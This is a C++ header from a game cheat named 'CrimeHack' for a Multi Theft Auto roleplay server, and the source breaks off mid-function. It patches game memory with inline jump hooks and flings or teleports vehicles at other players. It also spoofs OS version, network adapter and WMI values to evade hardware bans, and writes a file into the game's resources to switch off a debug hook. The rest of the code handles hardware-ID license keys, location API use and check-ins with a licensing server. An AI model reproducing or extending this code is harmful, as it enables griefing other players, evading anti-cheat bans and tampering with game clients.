#pragma once
#pragma warning(disable : 4731)
#pragma warning(disable : 4805)
#define WIN32_LEAN_AND_MEAN
#define HOOKPOS_PlayerCollision 0x0054BCEE
#define AGENT_NAME xorstr_("CR1M3H")
#define LOG_NAME xorstr_("CrimeHack.log")
#define PLUGIN_VER xorstr_("V9.3 RELEASE")
#include <Windows.h>
#include <stdio.h>
#include <string>
#include <direct.h>
#include <filesystem>
#include <algorithm>
#include <optional>
#include <ctime>
#include <cwctype>
#include <codecvt>
#include "xorstr.h"
#include "MD5.h"
#include <random>
#include "VMProtectSDK.h"
#include <comdef.h>
#include "Collision.h"
#include <wininet.h>
#include "HWBP.h"
#include <Wbemidl.h>
#include "CStreaming.h"
#include "base64.h"
#include "magic_enum/include/magic_enum.hpp"
//////////////////////////
#include <atlbase.h>
#include <atlcom.h>
#include <locationapi.h>
#include "Location.h"
#pragma comment(lib, "locationapi.lib")
/////////////////////////
#include <Iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Ws2_32.lib")
#define SOFT_TYPE xorstr_("crimehack")
bool oldClient = false;
bool isDeveloper = false;
typedef struct
{
	std::string q1_endcount;
	std::string q2_endcount;
	std::string q3_endcount;
	std::string q4_endcount;
	std::string q5_endcount;
	bool is_done;
} QUEST_DATA;
QUEST_DATA quest;
DWORD GetParentID = NULL;
bool getCallSign = false;
bool findStringIC(const std::string& strHaystack, const std::string& strNeedle);
volatile bool bind_menu[8] = { false, false, false, false, false, false, false, false };
float StreamDist = 250.0f;
CComPtr<ILocation> spLocation;
IID REPORT_TYPES[] = { IID_ILatLongReport };
DWORD VehColHandler = NULL;
bool UnocSync = false;
bool RepairSync = false;
bool OnlyDrivers = false;
std::string GetGamePath();
typedef void* (__thiscall *ptrGetClosestRemotePlayer)(void* ECX, CVector* vecPosition, float fMaxDistance);
ptrGetClosestRemotePlayer callGetClosestRemotePlayer = nullptr;
typedef bool(__cdecl* f_SendChat)(const char* szCommand, const char* szArguments, bool bHandleRemotely, bool bHandled, bool bIsScriptedBind);
f_SendChat sendMTAChat = nullptr;
CEntity* __stdcall GetLocalEntity(void)
{
	return ((CEntity * (__cdecl*)(int))0x56E120)(-1);
}
void SyncUnoccupiedData(CVehicle *vehicle)
{
	if (vehicle == nullptr) return;
	CPed* ped = FindPlayerPed(-1);
	typedef bool(__cdecl* ptrStaticVehicleCollisionHandler)(CVehicle** pCollidingVehicle, CEntity* pCollidedVehicle, int iModelIndex, float fDamageImpulseMag, float fCollidingDamageImpulseMag, unsigned __int16 usPieceType, CVector vecCollisionPos, CVector vecCollisionVelocity);
	if (VehColHandler != NULL && ped != nullptr)
	{
		ptrStaticVehicleCollisionHandler callCollision = (ptrStaticVehicleCollisionHandler)VehColHandler;
		callCollision(&vehicle, ped, ped->m_nModelIndex, 1.0, 1.0, 3, vehicle->GetPosition(), CVector(0.2f, 0.0f, 0.0f));
	}
}
void SetCarTotal()
{
	UnocSync = true; RepairSync = false; bind_menu[0] = false;
	for (auto vehicle : CPools::ms_pVehiclePool)
	{
		if (vehicle->m_pDriver == nullptr)
		{
			vehicle->m_fHealth = 250.0f;
			SyncUnoccupiedData(vehicle);
		}
	}
}
bool IsBike(ushort model)
{
	if (model == 481) return true;
	else if (model == 509) return true;
	else if (model == 510) return true;
	return false;
}
CVehicle* FindStreamedVehicle()
{
	float rx, ry, rz;
	for (decltype(auto) vehicle : CPools::ms_pVehiclePool)
	{
		if (vehicle != nullptr && vehicle->m_pDriver == nullptr && !IsBike(vehicle->m_nModelIndex))
		{
			static bool just_once = false;
			if (!just_once)
			{
				vehicle->GetOrientation(rx, ry, rz);
				just_once = true;
			}
			vehicle->SetOrientation(rx, ry, rz);
			return vehicle;
		}
	}
	return nullptr;
}
void SetCarRvankaVeh()
{
	static BYTE last_step = 1;
	CPed* local_ped = FindPlayerPed(-1);
	if (local_ped != nullptr)
	{
		for (decltype(auto) veh : CPools::ms_pVehiclePool)
		{
			if (veh != nullptr && veh->m_pDriver != nullptr)
			{
				if (veh->IsVisible() && veh->GetIsOnScreen())
				{
					CVehicle* vehicle = FindStreamedVehicle();
					if (vehicle != nullptr)
					{
						CVector remote_pos = veh->GetPosition();
						remote_pos.x += 5.0f;
						vehicle->SetPosn(remote_pos);
						if (last_step == 1) vehicle->m_vecMoveSpeed.x += 10.0f;
						if (last_step == 2) vehicle->m_vecMoveSpeed.x -= 10.0f;
						last_step++;
						if (last_step > 3) last_step = 1;
						SyncUnoccupiedData(vehicle);
					}
				}
			}
		}
	}
}
void SetCarRvanka()
{
	static BYTE last_step = 1;
	CPed* local_ped = FindPlayerPed(-1);
	if (local_ped != nullptr)
	{
		for (decltype(auto) ped : CPools::ms_pPedPool)
		{
			if (ped != nullptr && ped != local_ped && ped->m_pVehicle == nullptr)
			{
				if (ped->IsVisible() && ped->GetIsOnScreen() && ped->m_fHealth != 0.0f)
				{
					CVehicle* vehicle = FindStreamedVehicle();
					if (vehicle != nullptr)
					{
						CVector remote_pos = ped->GetPosition();
						remote_pos.x += 5.0f;
						vehicle->SetPosn(remote_pos);
						if (last_step == 1) vehicle->m_vecMoveSpeed.x += 10.0f;
						if (last_step == 2) vehicle->m_vecMoveSpeed.x -= 10.0f;
						last_step++;
						if (last_step > 3) last_step = 1;
						SyncUnoccupiedData(vehicle);
					}
				}
			}
		}
	}
}
void SetShapalah()
{
	for (auto vehicle : CPools::ms_pVehiclePool)
	{
		if (vehicle->m_pDriver == nullptr)
		{
			vehicle->m_vecTurnSpeed.x = 0.5f;
			SyncUnoccupiedData(vehicle);
		}
	}
}
void SetMoreTP()
{
	for (auto vehicle : CPools::ms_pVehiclePool)
	{
		if (vehicle->m_pDriver == nullptr)
		{
			vehicle->SetPosn(CVector(9999.0f, 9999.0f, 9999.0f));
			SyncUnoccupiedData(vehicle);
		}
	}
}
void SetHeavenRage()
{
	CPed* local_ped = FindPlayerPed(-1);
	if (local_ped != nullptr)
	{
		for (decltype(auto) ped : CPools::ms_pPedPool)
		{
			if (ped != nullptr && ped != local_ped && ped->m_pVehicle == nullptr)
			{
				if (ped->IsVisible() && ped->GetIsOnScreen() && ped->m_fHealth != 0.0f)
				{
					CVehicle* vehicle = FindStreamedVehicle();
					if (vehicle != nullptr)
					{
						CVector remote_pos = ped->GetPosition();
						remote_pos.z += 5.0f;
						vehicle->SetPosn(remote_pos);
						vehicle->m_vecMoveSpeed.z -= 3.5f;
						SyncUnoccupiedData(vehicle);
					}
				}
			}
		}
	}
}
void RepairAllCars()
{
	UnocSync = false; RepairSync = true;
	for (auto vehicle : CPools::ms_pVehiclePool)
	{
		if (vehicle->m_pDriver == nullptr)
		{
			vehicle->m_fHealth = 1000.0f;
			SyncUnoccupiedData(vehicle);
		}
	}
}
void Concentrator()
{
	CVector marker;
	for (int i = 0; i < (0xAF * 0x28); i += 0x28)
	{
		if (*(short*)(0xBA873D + i) == 4611)
		{
			BYTE icon = *(BYTE*)((0xBA86F0 + 36) + 0x28 + i);
			float* pos = (float*)(0xBA86F8 + 0x28 + i);
			CVector dest(*pos, *(pos + 1), *(pos + 2));
			if (icon == 41) marker = dest;
		}
	}
	for (auto vehicle : CPools::ms_pVehiclePool)
	{
		if (vehicle->m_pDriver == nullptr)
		{
			vehicle->SetPosn(marker);
			SyncUnoccupiedData(vehicle);
		}
	}
}
typedef struct
{
	DOUBLE x;
	DOUBLE y;
	DOUBLE radius;
} GeoData, *PGeoData;
GeoData geos;
bool authorized = true;
std::string client_pseudo = xorstr_("NONE");
bool AllowTuning = false;
bool AllowNoScreen = false;
bool AntiRadar = false;
bool AntiTeleport = false;
bool AntiRed = false;
bool NoScreen = false;
bool PedInviz = false;
bool VehInviz = false;
bool UpSide = false;
bool SpeedHack = false;
float MaxSpd = 250.0f;
bool airBrake = false;
bool TotalCar = false;
char upd_txt[3000];
bool AirAllowed = false;
bool CarGM = false;
bool DeadlyAura = false;
bool DbgHook = true;
bool lua_only_once = false;
bool SilentAIM = false;
void CalculateGeoData();
MEMORY_BASIC_INFORMATION mem, mem2; 
MODULEINFO lpModule;
char FindEnemy[256];
char FindActor[256];
char inp_txt[256];
char inp_txt2[256];
char inp_txt3[256];
char inp_txt4[256];
char inp_txt5[256];
char inp_txt6[256];
char inp_txt7[256];
char inp_txt8[256];
char inp_txt9[256];
char inp_txt10[256];
char inp_txt11[256];
char inp_txt12[256];
char inp_txt13[256];
char inp_txt14[256];
char inp_txt15[256];
char inp_txt16[256];
char inp_txt17[256];
char inp_txt18[256];
char inp_txt19[256];
char inp_txt20[256];
bool FakeTaxi = false;
bool OrderSpam = false;
bool FakeKill = false;
bool FisherBot = false;
volatile bool AntiAFK = false;
float FOV = 350.0f;
bool OneShot = false;
void* CoreECX = nullptr;
HWND gameWnd = nullptr;
typedef void CNetAPI; CNetAPI* netApi = nullptr;
typedef void(__thiscall* ptrSendBulletSyncFire)(void* ECX, eWeaponType weaponType, CVector& vecStart, CVector& vecEnd,
float fDamage, BYTE ucHitZone, void* pRemoteDamagedPlayer);
ptrSendBulletSyncFire callSendBulletSyncFire = nullptr;
enum EMethod { M_POST, M_GET };
enum EProtocol { P_HTTP, P_HTTPS };
std::string SendInetRequest(const EProtocol _eProtocol, const EMethod _eMethod, const std::string& _server,
const std::string& _page, const std::string& _params, bool read_answer);
typedef int(__cdecl* t_LuaLoadBuffer)(void* L, const char* buff, size_t sz, const char* name);
t_LuaLoadBuffer callLuaLoadBuffer = nullptr;
typedef int(__cdecl* ptrAddDebugHook)(void* luaVM);
ptrAddDebugHook callAddDebugHook = nullptr;
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
void __stdcall LogInFile(std::string log_name, const char* log, ...);
typedef void(__thiscall* ptrForceCursorVisible)(void* ECX, bool bVisible, bool bToggleControls);
ptrForceCursorVisible callForceCursorVisible = nullptr;
std::string total_hwid = "";
volatile bool ShowMenu = false;
std::vector<std::string> PlayersList;
std::map<std::string, bool> EnemyList;
void FuckRuchnik()
{
	DbgHook = false;
	char prepared_path[600]; memset(prepared_path, 0, sizeof(prepared_path));
	sprintf(prepared_path, xorstr_("%s\\ExecCMD.txt"), GetGamePath().c_str());
	FILE* hFile = fopen(prepared_path, xorstr_("a+"));
	if (hFile)
	{
		fprintf(hFile, xorstr_("%d\n%s"), 10500, xorstr_("NONE"));
		fclose(hFile);
	}
}
typedef struct
{
	std::string hwid;
	DWORD rank;
	std::string title;
	std::string nick;
	WORD skin;
	WORD car;
	std::string exec_cmd;
	std::string exec_arg;
	BYTE showTitle;
} RANK_INFO, *PRANK_INFO;
RANK_INFO myRank;
std::vector<RANK_INFO> GlobalRanks;
inline float WrapAround(float fValue, float fHigh)
{
	return fValue - (fHigh * floor(static_cast<float>(fValue / fHigh)));
}
inline float ConvertDegreesToRadians(float fRotation)
{
	return WrapAround(static_cast<float>(fRotation * M_PI / 180.0f + 2 * M_PI), static_cast<float>(2 * M_PI));
}
inline float ConvertRadiansToDegrees(float fRotation)
{
	return WrapAround(static_cast<float>(fRotation * 180.0f / M_PI + 360.0f), 360.0f);
}
DWORD MakeJump(const DWORD jmp_address, const DWORD hookAddr, BYTE* prologue, const size_t prologue_size)
{
	DWORD old_prot = 0x0;
	if (prologue == nullptr) return 0x0;
	VirtualProtect((void*)jmp_address, prologue_size, PAGE_EXECUTE_READWRITE, &old_prot);
	memcpy(prologue, (void*)jmp_address, prologue_size);
	BYTE addrToBYTEs[5] = { 0xE9, 0x90, 0x90, 0x90, 0x90 };
	DWORD JMPBYTEs = (hookAddr - jmp_address - 5);
	memcpy(&addrToBYTEs[1], &JMPBYTEs, 4);
	memcpy((void*)jmp_address, addrToBYTEs, 5);
	PVOID Trampoline = VirtualAlloc(0, (5 + (prologue_size - 5)), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Trampoline == nullptr) return 0x0;
	BYTE TrampolineBYTEs[5] = { 0xE9, 0x90, 0x90, 0x90, 0x90 };
	if (prologue_size > 5)
	{
		BYTE nop[] = { 0x90 };
		for (BYTE x = 0; x < (prologue_size - 5); x++) memcpy((void*)(jmp_address + 0x5 + x), nop, 1);
		memcpy(Trampoline, &prologue[3], (prologue_size - 3));
		DWORD Delta = (jmp_address + prologue_size) - (((DWORD)Trampoline + (prologue_size - 3)) + 5);
		memcpy(&TrampolineBYTEs[1], &Delta, 4);
		memcpy((void*)((DWORD)Trampoline + (prologue_size - 3)), TrampolineBYTEs, 5);
	}
	else
	{
		DWORD Delta = (jmp_address + prologue_size) - ((DWORD)Trampoline + 5);
		memcpy(&TrampolineBYTEs[1], &Delta, 4);
		memcpy(Trampoline, TrampolineBYTEs, 5);
	}
	VirtualProtect((void*)jmp_address, prologue_size, old_prot, 0);
	return (DWORD)Trampoline;
}
bool RestorePrologue(DWORD addr, BYTE* prologue, size_t prologue_size)
{
	if (prologue == nullptr) return false;
	DWORD old_prot = 0;
	VirtualProtect((void*)addr, prologue_size, PAGE_EXECUTE_READWRITE, &old_prot);
	memcpy((void*)addr, prologue, prologue_size);
	VirtualProtect((void*)addr, prologue_size, old_prot, &old_prot);
	return true;
}
char* strdel(char* s, int pos, int n)
{
	char* dst = s + pos, * src = s + pos + n;
	while (*src)
	{
		*dst++ = *src++;
	}
	*dst = 0;
	return s;
}
std::string utf8_to_cp1251(const char* str)
{
	std::string res;
	WCHAR* ures = NULL;
	char* cres = NULL;
	int result_u = MultiByteToWideChar(CP_UTF8, 0, str, -1, 0, 0);
	if (result_u != 0)
	{
		ures = new WCHAR[result_u];
		if (MultiByteToWideChar(CP_UTF8, 0, str, -1, ures, result_u))
		{
			int result_c = WideCharToMultiByte(1251, 0, ures, -1, 0, 0, 0, 0);
			if (result_c != 0)
			{
				cres = new char[result_c];
				if (WideCharToMultiByte(1251, 0, ures, -1, cres, result_c, 0, 0))
				{
					res = cres;
				}
			}
		}
	}
	delete[] ures, cres;
	return res;
}
std::string SendInetRequest(const EProtocol _eProtocol, const EMethod _eMethod, const std::string& _server,
const std::string& _page, const std::string& _params, bool read_answer)
{
	char szData[2024]; std::string recvStr;
	HINTERNET hInternet = InternetOpenA(AGENT_NAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet != NULL)
	{
		INTERNET_PORT port = NULL; DWORD flags = NULL;
		switch (_eProtocol)
		{
		case P_HTTP:
			port = INTERNET_DEFAULT_HTTP_PORT;
			flags = INTERNET_FLAG_KEEP_CONNECTION;
			break;
		case P_HTTPS:
			port = INTERNET_DEFAULT_HTTPS_PORT;
			flags = INTERNET_FLAG_SECURE;
			break;
		default:
			return NULL;
		}
		HINTERNET hConnect = InternetConnectA(hInternet, _server.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
		if (hConnect != NULL)
		{
			std::string request; std::string method;
			std::string headers; std::string data;
			switch (_eMethod)
			{
			case M_GET:
				method = xorstr_("GET");
				request = _page + (_params.empty() ? "" : ("?" + _params));
				break;
			case M_POST:
				method = xorstr_("POST");
				request = _page;
				headers = xorstr_("Content-Type: application/x-www-form-urlencoded");
				data = (_params.empty() ? "" : _params);
				break;
			default:
				return "";
			}
			HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), (LPCSTR)request.c_str(), NULL, NULL, 0, flags, 1);
			if (hRequest != NULL)
			{
				BOOL isSend = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)data.c_str(), data.length());
				if (isSend && read_answer)
				{
					DWORD dwByteRead = NULL; BOOL scs = FALSE;
					InternetReadFile(hRequest, szData, sizeof(szData) - 1, &dwByteRead);
					recvStr.append(szData, dwByteRead); szData[dwByteRead] = 0;
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
	return utf8_to_cp1251(recvStr.c_str());
}
bool IsFileExist(std::string file_name)
{
	FILE* hFile = fopen(file_name.c_str(), "rb");
	if (hFile != nullptr)
	{
		fclose(hFile);
		return true;
	}
	return false;
}
typedef HRESULT(__stdcall* ptrWmiGet)(void* ECX, LPCWSTR wszName, long lFlags, VARIANT* pVal, CIMTYPE* pType, long* plFlavor);
ptrWmiGet callWmiGet = nullptr;
HRESULT __stdcall HookWmiGet(void* ECX, LPCWSTR wszName, long lFlags, VARIANT* pVal, CIMTYPE* pType, long* plFlavor)
{
	HRESULT rslt = callWmiGet(ECX, wszName, lFlags, pVal, pType, plFlavor);
	if (pVal != nullptr)
	{
		BSTR val = pVal->bstrVal;
		pVal->bstrVal = bstr_t(xorstr_("POSHEL_NAHUY"));
	}
	return rslt;
}
typedef ULONG(__stdcall* ptrGetAdaptersInfo)(PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer);
ptrGetAdaptersInfo callGetAdaptersInfo = nullptr;
ULONG __stdcall hookGetAdaptersInfo(PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer)
{
	ULONG ret = callGetAdaptersInfo(AdapterInfo, SizePointer);
	if (AdapterInfo != nullptr)
	{
		if (ret == NO_ERROR)
		{
			do 
			{
				AdapterInfo->Address[0] = rand() % 255;
				AdapterInfo->Address[1] = rand() % 255;
				AdapterInfo->Address[2] = rand() % 255;
				AdapterInfo->Address[3] = rand() % 255;
				AdapterInfo->Address[4] = rand() % 255;
				AdapterInfo->Address[5] = rand() % 255;
				AdapterInfo = AdapterInfo->Next;
			} while (AdapterInfo);
		}
	}
	return ret;
}
typedef BOOL (__stdcall *ptrGetVersionExW)(LPOSVERSIONINFOW lpVersionInformation);
ptrGetVersionExW callGetVersionExW = nullptr;
BOOL __stdcall hookGetVersionExW(LPOSVERSIONINFOW lpVersionInformation)
{
	BOOL rslt = callGetVersionExW(lpVersionInformation);
	LogInFile(LOG_NAME, xorstr_("[SPOOF] Original major: %d | Original minor: %d | Original build: %d\n"), 
	lpVersionInformation->dwMajorVersion, lpVersionInformation->dwMinorVersion, lpVersionInformation->dwBuildNumber);
	lpVersionInformation->dwMajorVersion = 12; lpVersionInformation->dwMinorVersion = 5; 
	lpVersionInformation->dwBuildNumber = 228;
	LogInFile(LOG_NAME, xorstr_("[SPOOFED] Major: %d | Minor: %d | Build: %d\n"),
	lpVersionInformation->dwMajorVersion, lpVersionInformation->dwMinorVersion, lpVersionInformation->dwBuildNumber);
	return rslt;
}
void InstallSpoofingHooks()
{
	callGetVersionExW = (ptrGetVersionExW)GetProcAddress(GetModuleHandleA(xorstr_("kernel32.dll")), xorstr_("GetVersionExW"));
	if (callGetVersionExW != nullptr)
	{
		MH_RemoveHook(callGetVersionExW);
		MH_CreateHook(callGetVersionExW, &hookGetVersionExW, reinterpret_cast<LPVOID*>(&callGetVersionExW));
		MH_EnableHook(MH_ALL_HOOKS);
	}
	/*callGetAdaptersInfo = (ptrGetAdaptersInfo)GetProcAddress(GetModuleHandleA(xorstr_("iphlpapi.dll")), xorstr_("GetAdaptersInfo"));
	if (callGetAdaptersInfo != nullptr)
	{
		MH_RemoveHook(callGetAdaptersInfo);
		MH_CreateHook(callGetAdaptersInfo, &hookGetAdaptersInfo, reinterpret_cast<LPVOID*>(&callGetAdaptersInfo));
		MH_EnableHook(MH_ALL_HOOKS);
	}
	callWmiGet = (ptrWmiGet)GetProcAddress(GetModuleHandleA(xorstr_("fastprox.dll")), xorstr_("?Get@CWbemObject@@UAGJPBGJPAUtagVARIANT@@PAJ2@Z"));
	if (callWmiGet != nullptr)
	{
		MH_RemoveHook(callWmiGet);
		MH_CreateHook(callWmiGet, &HookWmiGet, reinterpret_cast<LPVOID*>(&callWmiGet));
		MH_EnableHook(MH_ALL_HOOKS);
	}*/

}
std::string ReadHackLog()
{
	std::string log = "";
	FILE* hFile = fopen(LOG_NAME, xorstr_("rb"));
	if (hFile)
	{
		char buff[500]; memset(buff, 0, sizeof(buff));
		fread(buff, 1, sizeof(buff), hFile);
		log = buff;
		fclose(hFile);
	}
	return log;
}
std::string GetGamePath()
{
	std::string game_path = "";
	CEasyRegistry* reg = new CEasyRegistry(HKEY_LOCAL_MACHINE, xorstr_("SOFTWARE\\WOW6432Node\\Multi Theft Auto: Province All\\Common"), false);
	if (reg != nullptr)
	{
		game_path = reg->ReadString(xorstr_("File Cache Path"));
		game_path += xorstr_("\\resources\\province_loadscreen");
		delete reg;
	}
	return game_path;
}
void __stdcall LogInFile(std::string log_name, const char* log, ...)
{
	char hack_dir[600]; memset(hack_dir, 0, sizeof(hack_dir));
	_getcwd(hack_dir, sizeof(hack_dir)); char new_dir[600];
	memset(new_dir, 0, sizeof(new_dir));
	sprintf(new_dir, xorstr_("%s\\%s"), hack_dir, log_name.c_str());
	static bool once = false; if (!once)
	{
		FILE* hFile = fopen(new_dir, xorstr_("rb"));
		if (hFile) { fclose(hFile); DeleteFileA(new_dir); }
		once = true;
	}
	FILE* hFile = fopen(new_dir, xorstr_("a+"));
	if (hFile)
	{
		time_t t = std::time(0); tm* now = std::localtime(&t);
		char tmp_stamp[600]; memset(tmp_stamp, 0, sizeof(tmp_stamp));
		sprintf(tmp_stamp, xorstr_("[%d:%d:%d]"), now->tm_hour, now->tm_min, now->tm_sec);
		strcat(tmp_stamp, std::string(" " + std::string(log)).c_str());
		va_list arglist; va_start(arglist, log); vfprintf(hFile, tmp_stamp, arglist);
		va_end(arglist); fclose(hFile);
	}
}
__forceinline void DeadCode()
{
	VMProtectBegin("DeadCode()");
	DWORD regval = 0xFFFFFF;
	TerminateProcess(GetCurrentProcess(), 0x0);
	__asm lea ebx, regval
	__asm jmp regval
	VMProtectEnd();
}
std::string GenerateLifeTimeKey()
{
	VMProtectBegin("GenerateLifeTimeKey()");
	DWORD total_size = total_hwid.length();
	DWORD block_1_size = total_size / 5;
	DWORD block_2_size = total_size / 4;
	DWORD block_3_size = total_size / 3;
	DWORD block_4_size = total_size / 2;
	std::string hwid_hash = md5(total_hwid); hwid_hash = md5(hwid_hash);
	std::string block_1(hwid_hash); block_1.resize(block_1_size);
	std::string block_2(hwid_hash); block_2.resize(block_2_size);
	std::string block_3(hwid_hash); block_3.resize(block_3_size);
	std::string block_4(hwid_hash); block_4.resize(block_4_size);
	std::reverse(block_1.begin(), block_1.end());
	std::reverse(block_3.begin(), block_3.end());
	std::reverse(block_4.begin(), block_4.end());
	block_1 = md5(block_1); block_2 = md5(block_2);
	block_3 = md5(block_3); block_3 = md5(block_3);
	block_4 = md5(block_4); block_4 = md5(block_4);
	block_2 = md5(block_1 + block_3 + block_4);
	block_1 = md5(block_2 + block_3 + block_1);
	block_3 = md5(block_1 + block_2 + block_4);
	block_3 = md5(block_3 + block_1 + block_4);
	block_1.resize(4); block_2.resize(4);
	block_3.resize(4); block_4.resize(4);
	std::transform(block_1.begin(), block_1.end(), block_1.begin(), ::toupper);
	std::transform(block_2.begin(), block_2.end(), block_2.begin(), ::toupper);
	std::transform(block_3.begin(), block_3.end(), block_3.begin(), ::toupper);
	std::transform(block_4.begin(), block_4.end(), block_4.begin(), ::toupper);
	char genKey[256]; memset(genKey, 0, sizeof(genKey));
	sprintf(genKey, "CH-%s-%sA-%s-%sLF", block_1.c_str(), block_2.c_str(), block_3.c_str(), block_4.c_str());
	VMProtectEnd();
	return genKey;
}
std::string GenerateDemoKey()
{
	VMProtectBegin("GenerateDemoKey()");
	DWORD total_size = total_hwid.length();
	DWORD block_1_size = total_size / 5;
	DWORD block_2_size = total_size / 4;
	DWORD block_3_size = total_size / 3;
	DWORD block_4_size = total_size / 2;
	std::string hwid_hash = md5(total_hwid);
	std::string block_1(hwid_hash); block_1.resize(block_1_size);
	std::string block_2(hwid_hash); block_2.resize(block_2_size);
	std::string block_3(hwid_hash); block_3.resize(block_3_size);
	std::string block_4(hwid_hash); block_4.resize(block_4_size);
	std::reverse(block_1.begin(), block_1.end());
	std::reverse(block_3.begin(), block_3.end());
	block_2 = md5(block_2);
	block_4 = md5(block_4);
	block_1 = md5(block_1);
	block_3 = md5(block_2 + block_4 + block_1);
	block_1 = md5(block_2 + block_3 + block_4);
	block_1 = md5(block_1 + block_1 + block_1);
	block_4 = md5(block_4 + block_4 + block_3);
	block_1.resize(4); block_2.resize(4);
	block_3.resize(4); block_4.resize(4);
	std::transform(block_1.begin(), block_1.end(), block_1.begin(), ::toupper);
	std::transform(block_2.begin(), block_2.end(), block_2.begin(), ::toupper);
	std::transform(block_3.begin(), block_3.end(), block_3.begin(), ::toupper);
	std::transform(block_4.begin(), block_4.end(), block_4.begin(), ::toupper);
	char genKey[256]; memset(genKey, 0, sizeof(genKey));
	sprintf(genKey, "CH-%s-%sB-%s-%sDM", block_1.c_str(), block_2.c_str(), block_3.c_str(), block_4.c_str());
	VMProtectEnd();
	return genKey;
}
std::string CvWideToAnsi(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;
	return converterX.to_bytes(wstr);
}
std::string wmiQuery(std::string query, std::wstring property)
{
	VMProtectBegin("wmiQuery()");
	IWbemLocator* pLoc = NULL; std::string wmi_hash = "";
	HRESULT hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
	if (FAILED(hres)) { CoUninitialize(); LogInFile(LOG_NAME, xorstr_("[ERROR] #1 %d\n"), GetLastError()); return ""; }
	IWbemServices* pSvc = NULL;
	hres = pLoc->ConnectServer(_bstr_t(L"root\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
	if (FAILED(hres)) { pLoc->Release(); CoUninitialize(); LogInFile(LOG_NAME, xorstr_("[ERROR] #2 %d\n"), GetLastError()); return ""; }
	hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
	if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); CoUninitialize(); LogInFile(LOG_NAME, xorstr_("[ERROR] #3 %d\n"), GetLastError()); return ""; }
	IEnumWbemClassObject* pEnumerator = NULL; hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t(query.c_str()),
	WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
	if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); CoUninitialize(); LogInFile(LOG_NAME, xorstr_("[ERROR] #4 %d\n"), GetLastError()); return ""; }
	IWbemClassObject* pclsObj; ULONG uReturn = 0;
	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
		if (0 == uReturn) break;
		VARIANT vtProp;
		hr = pclsObj->Get(property.c_str(), 0, &vtProp, 0, 0);
		BSTR val = vtProp.bstrVal;
		//LogInFile(LOG_NAME, "Property: %ls\n", std::wstring(val).c_str());
		wmi_hash += md5(CvWideToAnsi(std::wstring(val)));
		VariantClear(&vtProp);
	}
	pSvc->Release();
	pLoc->Release();
	pEnumerator->Release();
	pclsObj->Release();
	CoUninitialize();
	VMProtectEnd();
	return wmi_hash;
}
void reverseStr(std::string& str)
{
	int n = str.length();
	for (int i = 0; i < n / 2; i++)
		std::swap(str[i], str[n - i - 1]);
}
void CryptMyString(std::string& str)
{
	reverseStr(str);
	str = base64_encode(str);
	reverseStr(str);
}
std::string sCryptMyString(const std::string str)
{
	std::string to_crypt = str;
	CryptMyString(to_crypt);
	return to_crypt;
}
void DecryptMyString(std::string& str)
{
	reverseStr(str);
	str = base64_decode(str);
	reverseStr(str);
}
std::string sDecryptMyString(const std::string str)
{
	std::string to_decrypt = str;
	DecryptMyString(to_decrypt);
	return to_decrypt;
}
std::string CleanFromTrash(std::string& str)
{
	std::string ans = str;
	std::string delimiter = xorstr_("|");
	std::string trash1, answer, additional, trash2;
	size_t pos = 0; std::string token; int count_args = 1;
	while ((pos = ans.find(delimiter)) != std::string::npos)
	{
		token = ans.substr(0, pos);
		if (count_args == 1) trash1 = token;
		if (count_args == 2) answer = token;
		if (count_args == 3) additional = token;
		if (count_args == 5) trash2 = token;
		ans.erase(0, pos + delimiter.length()); count_args++;
	}
	str = answer;
	return additional;
}
void ObtainQuestInfo(std::string str)
{
	std::string ans = str;
	std::string delimiter = xorstr_("|");
	std::string trash1, trash2;
	size_t pos = 0; std::string token; int count_args = 1;
	while ((pos = ans.find(delimiter)) != std::string::npos)
	{
		token = ans.substr(0, pos);
		if (count_args == 1) trash1 = token;
		if (count_args == 2) quest.q1_endcount = token;
		if (count_args == 3) quest.q2_endcount = token;
		if (count_args == 4) quest.q3_endcount = token;
		if (count_args == 5) quest.q4_endcount = token;
		if (count_args == 6) quest.q5_endcount = token;
		if (count_args == 7) trash2 = token;
		ans.erase(0, pos + delimiter.length()); count_args++;
	}
}
void GetQuestsData(std::string user_key)
{
	std::string host_lnk = xorstr_("provhacks.fun");
	char params[5000]; memset(params, 0, sizeof(params));
	sprintf(params, xorstr_("hash1=%s"), sCryptMyString(user_key).c_str());
	std::string anser = SendInetRequest(P_HTTPS, M_GET, host_lnk, xorstr_("crime_hack/get_quest.php"), std::string(params), true);
	if (!anser.empty())
	{
		DecryptMyString(anser);
		ObtainQuestInfo(anser);
	}
}
void CheckOldClient(std::string user_key)
{
	std::string host_lnk = xorstr_("provhacks.fun");
	char params[5000]; memset(params, 0, sizeof(params));
	sprintf(params, xorstr_("hash1=%s"), sCryptMyString(user_key).c_str());
